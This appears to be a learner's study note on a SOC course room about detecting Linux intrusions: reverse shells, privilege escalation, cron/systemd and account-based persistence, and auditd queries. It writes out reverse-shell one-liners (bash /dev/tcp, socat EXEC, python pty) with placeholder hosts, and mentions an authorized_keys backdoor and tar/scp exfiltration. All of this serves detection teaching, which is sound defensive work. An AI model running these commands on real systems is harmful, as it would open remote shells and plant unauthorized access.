# Linux Threat Detection 3

**Path:** SOC Level 1 - Linux Security Monitoring
**Date:** 2026-09-16
**Difficulty:** Medium

---

## What This Room Covers

Where Room 2 covered opportunistic "hack and forget" attacks, this room covers the **later stages of a targeted intrusion**: getting a real interactive shell, escalating privileges, and — critically — staying on the box long-term through persistence that survives a reboot or even a partial cleanup. It closes with the bigger picture of *why* Linux matters even in mostly-Windows environments.

Room flow: Reverse Shells → Privilege Escalation → Persistence (Startup Methods) → Persistence (Account Methods) → Targeted Attacks — Big Picture.

---

## Reverse Shells

Needed when initial access (e.g. via a web exploit) doesn't hand the attacker a full interactive terminal. Instead, the *victim* connects back out to the attacker.

Common methods:

```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
socat TCP:<ip>:<port> EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Detection:** treat *any* reverse-shell tool execution as a critical/high alert on its own. Use auditd + `ausearch -i -x <tool>`, then:

- walk **up** the process tree (`--pid <ppid>`) to find the vulnerable parent application that spawned the shell
- walk **down** (`--ppid <pid>`) to see everything the attacker did afterward through that shell

---

## Privilege Escalation

A low-privilege foothold (e.g. a web service account) often isn't enough — the attacker needs full control. Which path they take depends entirely on what **Discovery** already revealed:

| Discovery Finding | Likely Privilege Escalation Path |
|---|---|
| Old/unpatched kernel or distro version | Known public exploit (e.g. **PwnKit**) |
| SUID-flagged binary (`find ... -perm 4000`) | Abuse the SUID binary directly |
| Exposed key/credential file | Reuse it to log in as a privileged account |

**Detection approach:** exploits themselves vary too much to catch individually, so detection focuses on the **pattern** around escalation instead:

- A spike of discovery commands, including security-tool discovery (e.g. `ps aux | egrep "edr|splunk|elastic"`)
- A tool downloaded, compiled, or executed from `/tmp` immediately after recon
- Comparing the **effective user (UID) before vs. after** a suspicious binary ran, via the process tree — a UID change (e.g. service account → root) confirms escalation succeeded
- Exfiltration commands (e.g. `tar` + `scp`) right after gaining root — a strong confirming signal that escalation was the goal

---

## Persistence — "Startup" Methods

Goal: survive a reboot.

| Method | How It Works | Real-World Example |
|---|---|---|
| **Cron jobs** | Malicious line added to `/etc/crontab`, `/etc/cron.d/*`, or `/var/spool/cron/<user>` | APT29's **GoldMax** uses an `@reboot` entry; **Rocke** cryptominer re-downloads its payload from Pastebin every 10 minutes, likely to survive cleanup attempts |
| **Systemd services** | A fake `.service` file with an innocent-looking description, placed in `/lib/systemd/system/` or `/etc/systemd/system/`, with `ExecStart=` pointing at the malware | **Sandworm's GOGETTER** malware disguised as a "cloud-online" service |

**Detection:**

- Monitor file changes to cron paths and systemd unit directories with auditd (`ausearch -i -f /etc/systemd`, etc.)
- Monitor execution of the management commands themselves: `crontab -e`, `systemctl start|enable <service>`

---

## Persistence — "Account" Methods

Goal: keep access **without leaving malware behind** — much harder to fully clean up, because there's no file to find.

- **New user account** — attacker creates a user and adds it to a privileged group (e.g. `sudo`). Detect via `/var/log/auth.log` (`useradd`/`usermod` entries), then build the process tree around the creation event to find what triggered it.
- **Backdoored SSH keys** — attacker appends their own public key to a legitimate user's `~/.ssh/authorized_keys`. Hard to spot visually since it blends in with real keys. **Gotcha:** if the key is added via a shell builtin (`echo key >> authorized_keys`), auditd only records the parent shell (e.g. `bash`) — not `echo` itself as a distinct process. The reliable defense is monitoring the **file**, not just process execution: `ausearch -i -f /.ssh/authorized_keys`.
- **Application-level persistence** — e.g. a web shell planted after a CMS or admin-panel compromise. Lives entirely inside the application, so it's typically invisible to auditd/OS-level logs. Flagged in the room as a genuine blind spot: if malware keeps reappearing despite clearing every OS-level persistence mechanism, check the public-facing application itself next.

---

## Targeted Attacks — Big Picture

- Linux boxes are frequently the **entry point** into otherwise Windows-heavy environments — firewalls, web servers, mail servers — so compromising one Linux host can cascade into a much larger breach.
- Linux is a real target for **espionage** (state-sponsored APTs — e.g. **Kimsuky** using systemd persistence) and increasingly for **ransomware**, especially against **hypervisors** hosting many VMs, where compromising a handful of physical Linux hosts can put an entire virtualized Windows fleet at risk.
- Core message of the room: Linux threat detection matters even in a shop that considers itself "mostly Windows."

---

## Cross-Room Cheat Sheet (Linux Threat Detection 2 & 3)

**Core auditd/ausearch workflow used throughout both rooms:**

1. `ausearch -i -x <command>` — find execution of a suspicious binary/command
2. `ausearch -i --pid <ppid>` — go **up** the tree to find what launched it (confirm legitimate vs. malicious origin)
3. `ausearch -i --ppid <pid>` — go **down** the tree to see everything spawned afterward (assess blast radius)
4. `ausearch -i -f <path>` — track **file-level** changes (needed for things like SSH keys or shell-builtin actions that don't show as their own process)
5. Cross-reference with `/var/log/auth.log` for SSH logins and `useradd`/`usermod` events

**High-signal indicators to always flag:**

- `whoami` execution by anything other than an interactive admin
- New or hidden files/directories in `/tmp` or `/var/tmp`
- `nohup` launching an unfamiliar binary
- Any reverse-shell tool invocation (`socat`, `bash -i`, Python `pty.spawn`, etc.)
- A UID change across a process chain (privilege escalation confirmation)
- Unexplained new cron entries, systemd unit files, user accounts, or SSH `authorized_keys` entries

---

## Key Terms

| Term | Meaning |
|---|---|
| **Reverse Shell** | Victim machine initiates the connection back to the attacker, bypassing inbound firewall rules |
| **PwnKit** | Well-known public Linux privilege-escalation exploit (Polkit) |
| **SUID Bit** | File permission bit that runs a binary as its owner (often root) regardless of who executes it |
| **UID** | User ID — the account a process is actually running as; the value to compare before/after an escalation attempt |
| **GoldMax** | APT29 malware using cron `@reboot` for persistence |
| **GOGETTER** | Sandworm malware disguised as a fake systemd service |
| **Web Shell** | Application-layer backdoor living inside a compromised web app, invisible to OS-level logging |

---

## My Understanding in Plain English

The throughline across both rooms is that **every stage leaves a different kind of trace, and none of them alone is proof** — a UID change on its own isn't suspicious, a new cron entry on its own isn't suspicious, but "recon, then a UID change, then a new cron entry, all within a few minutes of the same SSH session" absolutely is. What this room adds on top of Room 2 is the idea that **persistence is a deliberate trade-off the attacker makes**: file-based persistence (cron, systemd) is easy to plant but leaves something auditd can eventually catch, while account-based persistence (a new user, a backdoored key) leaves almost nothing to find except a single log line that looks identical to legitimate admin activity.

The backdoored-`authorized_keys` gotcha is the detail worth holding onto specifically — it's a reminder that auditd's process-centric view has real blind spots (shell builtins don't get their own process record), and that **file-integrity monitoring on a handful of high-value paths** (`authorized_keys`, cron directories, systemd unit directories) covers gaps that process auditing alone can't.

---

## Related Notes

- [[Linux-Threat-Detection-1]]
- [[Linux-Threat-Detection-2]]
- [[Linux-Logging-for-SOC]]
- [[MITRE]]
- [[Cyber-Kill-Chain]]
